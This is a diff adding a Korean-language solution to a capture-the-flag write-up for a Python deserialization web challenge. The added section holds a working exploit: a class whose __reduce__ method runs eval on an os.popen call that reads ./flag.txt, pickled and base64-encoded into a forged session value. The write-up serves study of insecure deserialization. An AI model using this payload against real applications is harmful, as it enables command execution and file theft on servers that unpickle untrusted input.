@@ -76,3 +76,26 @@ app.run(host='0.0.0.0', port=8000)
 <br/><br/>
 
 ## 문제 풀이(익스플로잇)
+1. ```__reduce__``` 메소드의 반환값으로 **./flag.txt**를 익는 시스템 명령어가 실행되도록 클래스를 작성한 다음, 이 클래스로 객체를 생성하여 문제의 세션 생성 코드와 동일한 방식으로 직렬화를 수행함
+    ```python
+    # deserialize-python-exploit.py
+    import pickle, base64, os
+
+    class vuln:
+        def __reduce__(self):
+            exploit_cmd = "os.popen('cat ./flag.txt').read()" # os.popen(cmd) 함수를 이용해 cmd에 연결된 파이프를 기본 모드인 r(read)로 열고, 이를 read() 함수로 읽어옴
+            return (eval, (exploit_cmd, )) # eval(expression) 함수로 해당 명령어를 실행시킴
+
+    info = { "name": vuln(), # name의 value: vuln 클래스로 작성한 객체
+            "userid": "user1",
+            "password": "1234"}
+
+    vulnData = base64.b64encode(pickle.dumps(info)).decode("utf8") # vuln 클래스로 생성한 객체가 들어간 info를 문제와 동일한 방식으로 직렬화함 
+    print(vulnData) # 해당 결과를 콘솔로 출력함
+    ```
+
+<br/>
+
+2. 콘솔에 출력된 값을 check_session 페이지의 sesion에 입력한 후 [Check] 버튼을 누르면 Name 부분에서 FLAG를 획득할 수 있음
+   <br/><br/>
+   <img width="1512" alt="web-deserialize-python_문제 풀이" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/7cc01540-6ab3-4bb4-8abc-679afb2842a9">
